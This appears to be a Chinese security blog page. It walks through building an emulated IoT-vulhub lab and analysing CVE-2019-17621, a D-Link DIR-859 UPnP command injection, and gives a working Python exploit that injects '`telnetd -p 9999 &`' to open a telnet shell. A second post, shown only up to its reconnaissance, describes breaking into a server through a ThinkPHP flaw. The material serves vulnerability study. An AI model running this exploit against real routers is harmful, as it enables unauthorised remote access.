+    <link itemprop="mainEntityOfPage" href="https://vxer-lee.github.io/2021/08/05/IoTSecurity/IoT-vulhub/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="VxerLee">
+      <meta itemprop="description" content="喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lee's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/08/05/IoTSecurity/IoT-vulhub/" class="post-title-link" itemprop="url">路由器漏洞环境仿真</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-05 10:05:50" itemprop="dateCreated datePublished" datetime="2021-08-05T10:05:50+08:00">2021-08-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-08-16 15:58:22" itemprop="dateModified" datetime="2021-08-16T15:58:22+08:00">2021-08-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">物联网安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <meta name="referrer" content="no-referrer"/>
+
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在研究路由器漏洞，要是每次分析个路由器都要上闲鱼买一个路由器真的费用有点高，所以在网上找了类似的路由器漏洞环境仿真的平台，运气不错在GitHub上找到一个开源项目<a target="_blank" rel="noopener" href="https://github.com/firmianay/IoT-vulhub">IoT-vulhub</a>，接下来就是记录自己搭建IoT固件漏洞复现环境的过程。  </p>
+<h2 id="0x01-IoT-vulhub安装"><a href="#0x01-IoT-vulhub安装" class="headerlink" title="0x01 IoT-vulhub安装"></a>0x01 IoT-vulhub安装</h2><h3 id="系统环境："><a href="#系统环境：" class="headerlink" title="系统环境："></a>系统环境：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">..............                                  </span><br><span class="line">            ..,;:ccc,.                           kali@kali</span><br><span class="line">          ......&#39;&#39;&#39;;lxO.                         OS: Kali Linux </span><br><span class="line">.....&#39;&#39;&#39;&#39;..........,:ld;                         Kernel: x86_64 Linux 5.5.0-kali2-amd64</span><br><span class="line">           .&#39;;;;:::;,,.x,                        Uptime: 1m</span><br><span class="line">      ..&#39;&#39;&#39;.            0Xxoc:,.  ...            Packages: 2170</span><br><span class="line">  ....                ,ONkc;,;cokOdc&#39;,.          Shell: bash</span><br><span class="line"> .                   OMo           &#39;:ddo.        Resolution: 1688x952</span><br><span class="line">                    dMc               :OO;       DE: Xfce</span><br><span class="line">                    0M.                 .:o.     WM: Xfwm4</span><br><span class="line">                    ;Wd                          WM Theme: Kali-Dark</span><br><span class="line">                     ;XO,                        GTK Theme: Kali-Dark [GTK2]</span><br><span class="line">                       ,d0Odlc;,..               Icon Theme: Flat-Remix-Blue-Dark</span><br><span class="line">                           ..&#39;,;:cdOOd::,.       Font: Cantarell 11</span><br><span class="line">                                    .:d;.&#39;:;.    Disk: 20G &#x2F; 63G (33%)</span><br><span class="line">                                       &#39;d,  .&#39;   CPU: Intel Core i7-6700 @ 2x 3.408GHz</span><br><span class="line">                                         ;l   .. GPU: VMware SVGA II Adapter</span><br><span class="line">                                          .o     RAM: 820MiB &#x2F; 3912MiB</span><br><span class="line">                                            c   </span><br><span class="line">                                            .&#39;  </span><br><span class="line">                                             .  </span><br></pre></td></tr></table></figure>
+<h3 id="安装依赖："><a href="#安装依赖：" class="headerlink" title="安装依赖："></a>安装依赖：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装Python3</span></span><br><span class="line"><span class="comment">#这个最好安装Python3.5以上,否则会有问题!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装pip</span></span><br><span class="line">$ curl -s https://bootstrap.pypa.io/get-pip.py | sudo python3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装最新版 docker</span></span><br><span class="line">$ curl -s https://get.docker.com/ | sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动docker 服务</span></span><br><span class="line">$ sudo service docker start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看安装的版本信息</span></span><br><span class="line">$ sudo docker version</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行hello,world</span></span><br><span class="line">$ sudo docker run hello-world</span><br><span class="line"></span><br><span class="line"><span class="comment"># 让普通用户也能运行 docker</span></span><br><span class="line">$ sudo usermod -aG docker <span class="variable">$USER</span> <span class="comment">#然后注销用户重新登录即可。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证</span></span><br><span class="line">$ docker images</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装docker-compose,最好用root权限装</span></span><br><span class="line">$ sudo python3 -m pip install docker-compose</span><br></pre></td></tr></table></figure>
+<h3 id="克隆项目"><a href="#克隆项目" class="headerlink" title="克隆项目"></a>克隆项目</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#克隆github 项目</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/firmianay/IoT-vulhub.git</span><br><span class="line"></span><br><span class="line"><span class="comment">#进入项目目录</span></span><br><span class="line"><span class="built_in">cd</span> IoT-vulhub</span><br></pre></td></tr></table></figure>
+
+<h3 id="构建Docker基础镜像"><a href="#构建Docker基础镜像" class="headerlink" title="构建Docker基础镜像"></a>构建Docker基础镜像</h3><p><strong>以下为必须构建的镜像</strong></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> Ubuntu 16.04系统镜像</li>
+<li><input checked="" disabled="" type="checkbox"> binwalk 以及 noentry版镜像</li>
+<li><input checked="" disabled="" type="checkbox"> firmadyne固件模拟镜像</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#漏洞仿真是根据每个镜像综合的利用,所以一定要构建这些镜像</span></span><br><span class="line">----------------------------系统-------------------------------</span><br><span class="line"><span class="comment"># 构建Ubuntu 16.04系统</span></span><br><span class="line">$ <span class="built_in">cd</span> baseImage/ubuntu1604 &amp;&amp; docker build -t firmianay/ubuntu1604 .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建binwalk容器,解压固件 和仿真用</span></span><br><span class="line">$ <span class="built_in">cd</span> baseImage/binwalk &amp;&amp; docker build -t firmianay/binwalk .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建noentry版本的binwalk镜像, firmadyne 基于该版本镜像</span></span><br><span class="line">$ <span class="built_in">cd</span> baseImage/binwalk &amp;&amp; vi Dockerfile (修改如下,注释ENTRYPOINT)</span><br><span class="line"><span class="comment">#ENTRYPOINT [&quot;binwalk&quot;]</span></span><br><span class="line">$ docker build -t firmianay/binwalk:noentry .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建firmadyne 模拟镜像</span></span><br><span class="line">$  <span class="built_in">cd</span> baseImage/firmadyne &amp;&amp; docker build -t firmianay/firmadyne .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建firmae 模拟镜像</span></span><br><span class="line">$ <span class="built_in">cd</span> baseImage/firmAE &amp;&amp; docker build -t firmianay/firmae .</span><br><span class="line"></span><br><span class="line">-----------------------------工具------------------------------</span><br><span class="line"><span class="comment"># 构建buildroot</span></span><br><span class="line">$ <span class="built_in">cd</span> baseImage/buildroot &amp;&amp; docker build -t firmianay/buildroot .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建busybox</span></span><br><span class="line">$ <span class="built_in">cd</span> baseImage/busybox &amp;&amp; docker build -t firmianay/busybox .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建gdbserver</span></span><br><span class="line">$ <span class="built_in">cd</span> baseImage/gdbserver &amp;&amp; docker build -t firmianay/gdbserver .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建QEMU 用户级模拟镜像</span></span><br><span class="line">$ <span class="built_in">cd</span> baseImage/qemu-user-static &amp;&amp; docker build -t firmianay/qemu-user-static .</span><br></pre></td></tr></table></figure>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144213115-325660259.png" alt="1"> </p>
+<h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><h3 id="模拟D-Link-DIR-859固件"><a href="#模拟D-Link-DIR-859固件" class="headerlink" title="模拟D-Link DIR-859固件"></a>模拟D-Link DIR-859固件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进入到D-Link\CVE2019-17621目录</span></span><br><span class="line"><span class="built_in">cd</span> D-Link/CVE-2019-17621/</span><br><span class="line"></span><br><span class="line"><span class="comment">#解压D-Link DIR-859固件</span></span><br><span class="line">$ docker run --rm -v <span class="variable">$PWD</span>/firmware/:/root/firmware firmianay/binwalk -Mer <span class="string">&quot;/root/firmware/DIR822A1_FW103WWb03.bin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#构建漏洞环境镜像</span></span><br><span class="line">$ sudo docker-compose -f docker-compose-firmadyne.yml build</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动模拟好的D-Link DIR-859漏洞环境 docker容器</span></span><br><span class="line">$ sudo docker-compose -f docker-compose-firmadyne.yml up</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用ssh开启socks代理,将漏洞环境网络代理出来,方便虚拟机操作</span></span><br><span class="line">$ ssh -D 2345 root@127.0.0.1 -p 1234 <span class="comment">#密码root</span></span><br><span class="line"><span class="comment">#开启socks代理</span></span><br><span class="line"><span class="comment">#代理端口:2345</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Google浏览器中安装Proxy SwitchyOmega插件，配置如下代理</span></span><br><span class="line">代理协议:SOCKS5</span><br><span class="line">代理服务器:127.0.0.1</span><br><span class="line">代理端口:2345 </span><br></pre></td></tr></table></figure>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144222243-307300690.png" alt="2"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144240991-1819902602.png" alt="3"> </p>
+<h3 id="CVE-2019-17621-命令注入漏洞-分析"><a href="#CVE-2019-17621-命令注入漏洞-分析" class="headerlink" title="CVE-2019-17621 (命令注入漏洞)分析"></a>CVE-2019-17621 (命令注入漏洞)分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">描述：</span><br><span class="line">DIR-859路由器用了UPNP协议，并且在某处调用fwrite()向文件中添加删除命令&#96;rm -f &quot;.$shell_file.&quot;\n&quot;&#96;,</span><br><span class="line">时候出现了漏洞，我们可以将shell_file内容改为反引号包裹的系统命令，来利用命令注入漏洞执行命令。</span><br></pre></td></tr></table></figure>
+
+<h4 id="UPNP协议简介"><a href="#UPNP协议简介" class="headerlink" title="UPNP协议简介:"></a>UPNP协议简介:</h4><p>UPnP全名是Universal Plug and Play，主要是微软在推行的一个标准。</br><br>简单的来说，UPnP 最大的愿景就是希望任何设备只要一接上网络，所有在网络上的设备马上就能知道有新设备加入，这些设备彼此之间能互相沟通，更能直接使用或控制它，一切都不需要设定，完全的Plug and Play。</p>
+<ul>
+<li>UPnP不需要设备驱动程序，因此使用UPnP建立的网络是介质无关的。</br></li>
+<li>同时UPnP使用标准的TCP/IP和网络协议，使它能够无缝的融入现有网络。</br></li>
+<li>构造UPnP应用程序时可以使用任何语言，并在任何操作系统平台上编译运行。</br></li>
+<li>对于设备的描述，使用HTML表单表述设备控制界面。它既允许设备供应商提供基于浏览器的用户界面和编程控制接口，也允许开发人员定制自己的设备界面。</li>
+</ul>
+<h4 id="漏洞所在位置"><a href="#漏洞所在位置" class="headerlink" title="漏洞所在位置:"></a>漏洞所在位置:</h4><p>二进制可执行文件<code>/htdocs/cgibin</code>中的<code>genacgi_main()</code>函数包含了可远程执行代码的漏洞。</br></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined4 <span class="title">genacgi_main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">............</span><br><span class="line">  iVar7 = (**(code **)(local_18 + <span class="number">-0x7d44</span>))(iVar6,<span class="string">&quot;?service=&quot;</span>,<span class="number">9</span>);<span class="comment">//iVar6 ?service= </span></span><br><span class="line">  <span class="keyword">if</span> (iVar7 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar7 = (**(code **)(local_18 + <span class="number">-0x7d30</span>))(pcVar4,<span class="string">&quot;SUBSCRIBE&quot;</span>);</span><br><span class="line">  uri_service = iVar6 + <span class="number">9</span>;<span class="comment">//uri_service 来自 iVar6</span></span><br><span class="line">..........</span><br><span class="line">pid = <span class="built_in">getpid</span>();</span><br><span class="line"><span class="built_in">sprintf</span>(buf8,</span><br><span class="line">        <span class="string">&quot;%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh&quot;</span></span><br><span class="line">        ,<span class="string">&quot;/htdocs/upnp/run.NOTIFY.php&quot;</span>,env_server_id,uri_service,env_http_callback + <span class="number">7</span>, http_callbak_uri+ <span class="number">1</span>,time_out</span><br><span class="line">        ,env_REMOTE_ADDR,<span class="string">&quot;/var/run&quot;</span>,uri_service,pid);</span><br><span class="line"><span class="built_in">xmldbc_ephp</span>(<span class="number">0</span>,<span class="number">0</span>,buf8,stdout);</span><br><span class="line">...........</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>sprintf()格式化字符串,将各种拼接的输出格式化输入到buf8中，主要关注<code>SHELL_FILE</code>将以格式%s_%d.sh进行传递，主要用于为新的shell脚本命名。</br><br>随后由 xmldbc_ephp()函数(最后调用send())将“buffer8”中包含的数据发送给PHP。</br></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">METHOD=SUBSCRIBE</span><br><span class="line">INF_UID=(NULL)</span><br><span class="line">SERVICE=<span class="string">&quot;9&quot;</span> <span class="comment">#漏洞就出在这里,我们可以控制SERVICE ，我们在这里如果输入`telnetd`，那他就会开启telnet服务</span></span><br><span class="line">HOST=<span class="string">&quot;192.168.0.1:49152&quot;</span></span><br><span class="line">URI=/ServiceProxy27&gt;</span><br><span class="line">TIMEOUT=1800</span><br><span class="line">REMOTE=<span class="string">&quot;192.168.0.2&quot;</span></span><br><span class="line">SHELL_FILE=<span class="string">&quot;/var/run/9_3120.sh&quot;</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li><code>xmldbc_ephp</code>函数就不具体分析了，有兴趣的自己可以深入分析下，他大致内容是把buf8的数据传<code>run.NOTIFY.php</code>处理 缓冲区中的数据，经过xmldbc_ephp处理，由PHP文件run.NOTIFY.php进行处理。</li>
+<li>run.NOTIFY.php调用<code>GENA_subscribe_new()</code>并传递cgibin程序中genacgi_main()函数获得的变量，还包括变量<code>SHELL_FILE</code>。</li>
+<li><code>GENA_subscribe_new</code>函数传递SHELL_FILE 到 <code>GENA_notify_init</code>函数，也是SHELL_FILE最终处理的地方：通过调用 PHP 函数fwrite()创建新文件。</li>
+<li><code>GENA_notify_init</code>函数中 fwrite() 函数被使用了两次 第一次创建文件，文件名为SHELL_FILE变量。</li>
+<li>第二次调用fwrite()向文件中添加 删除命令 “rm -f “.$shell_file.”\n”，（漏洞点触发原因）：</li>
+<li>进行攻击时，只需要插入一个反引号包裹的系统命令，将其注入到shell 脚本中。在脚本执行 rm 命令时因遇到 反引号而失败，继续执行引号里面的系统命令，从而达到远程命令执行漏洞的触发。</li>
+<li>进行攻击时，只需要插入一个反引号包裹的系统命令，将其注入到shell 脚本中。在脚本执行 rm 命令时因遇到 反引号而失败，继续执行引号里面的系统命令，从而达到远程命令执行漏洞的触发。</li>
+<li>进行攻击时，只需要插入一个反引号包裹的系统命令，将其注入到shell 脚本中。在脚本执行 rm 命令时因遇到 反引号而失败，继续执行引号里面的系统命令，从而达到远程命令执行漏洞的触发。</li>
+</ol>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144253485-2096627850.png" alt="4"> </p>
+<h4 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP:"></a>构造EXP:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">httpSUB</span>(<span class="params">server, port, shell_file</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n[*] Connection &#123;host&#125;:&#123;port&#125;&#x27;</span>.<span class="built_in">format</span>(host=server, port=port))</span><br><span class="line"></span><br><span class="line">    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    request  = <span class="string">&quot;SUBSCRIBE /gena.cgi?service=&quot;</span> + <span class="built_in">str</span>(shell_file) + <span class="string">&quot; HTTP/1.0\n&quot;</span> <span class="comment">#这里的shell_file就是我们反引号包裹的系统命令</span></span><br><span class="line">    request += <span class="string">&quot;Host: &quot;</span> + <span class="built_in">str</span>(server) + <span class="built_in">str</span>(port) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;NT: upnp:event\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Timeout: Second-1800\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Accept-Encoding: gzip, deflate\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Sending Payload&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    con.connect((socket.gethostbyname(server), port))</span><br><span class="line">    con.send(request.encode())</span><br><span class="line">    results = con.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Running Telnetd Service&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Opening Telnet Connection\n&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;telnet &#x27;</span> + <span class="built_in">str</span>(server) + <span class="string">&#x27; 9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line">serverInput = <span class="string">&quot;192.168.0.1&quot;</span></span><br><span class="line">portInput = <span class="number">49152</span></span><br><span class="line">httpSUB(serverInput, portInput, <span class="string">&#x27;`telnetd -p 9999 &amp;`&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="执行漏洞利用"><a href="#执行漏洞利用" class="headerlink" title="执行漏洞利用"></a>执行漏洞利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> tools</span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144328558-1556070785.png" alt="5"> </p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144333692-1608751906.png" alt="6"> </p>
+<p>欢迎各位大佬加群：研究PWN、RE、WEB安全等技巧</p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144446707-81792468.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://vxer-lee.github.io/2021/06/02/WebSecurity/ThinkPHPAndSunHack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="VxerLee">
+      <meta itemprop="description" content="喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lee's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/06/02/WebSecurity/ThinkPHPAndSunHack/" class="post-title-link" itemprop="url">渗透之从ThinkPHP漏洞到向日葵远控拿下诈骗服务器</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-06-02 19:21:00" itemprop="dateCreated datePublished" datetime="2021-06-02T19:21:00+08:00">2021-06-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-08-16 15:59:32" itemprop="dateModified" datetime="2021-08-16T15:59:32+08:00">2021-08-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <meta name="referrer" content="no-referrer"/>
+
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><blockquote>
+<p>任何渗透测试技术支持服务，都应该先拿到授权书后方可进行。</p>
+</blockquote>
+<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p><a target="_blank" rel="noopener" href="http://www.xxxx.cn/login">http://www.xxxx.cn/login</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FrontFrame: Twitter Bootstrap,jQuery Sparklines,OWL Carousel,Font Awesome,JQuery:1.8.3,HTML5</span><br><span class="line">Widget: Access-Control</span><br><span class="line">Language: PHP&#x2F;7.1.13,PHP:7.1.13  (PHP框架)</span><br><span class="line">WebService: Nginx</span><br><span class="line">Other: Author:Mosaddek,Embed JSON</span><br><span class="line">xxx.xxx.xxx.xxx [香港 ThinkDream数据中心]</span><br><span class="line">域名注册商	阿里巴巴云计算（北京）有限公司</span><br></pre></td></tr></table></figure>
+<p>没识别到相关的CMS组件信息，我们进行手动操作，随便输入点什么让服务器报错回显有关信息。<br>比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.cn&#x2F;apip.php</span><br><span class="line">回显：</span><br><span class="line">熟悉的面孔，thinkphp</span><br><span class="line">ThinkPHP V5.0.22 &#123; 十年磨一剑-为API开发设计的高性能框架 &#125; （ThinkPHP 5.0.22）</span><br><span class="line">THINK_PATH D:\phpStudy\PHPTutorial\WWW\xxx\thinkphp\ （Windows 服务器，phpStudy）</span><br><span class="line">Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2j mod_fcgid&#x2F;2.3.9 （Apache）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150536227-1656712009.png" alt="1"> </p>
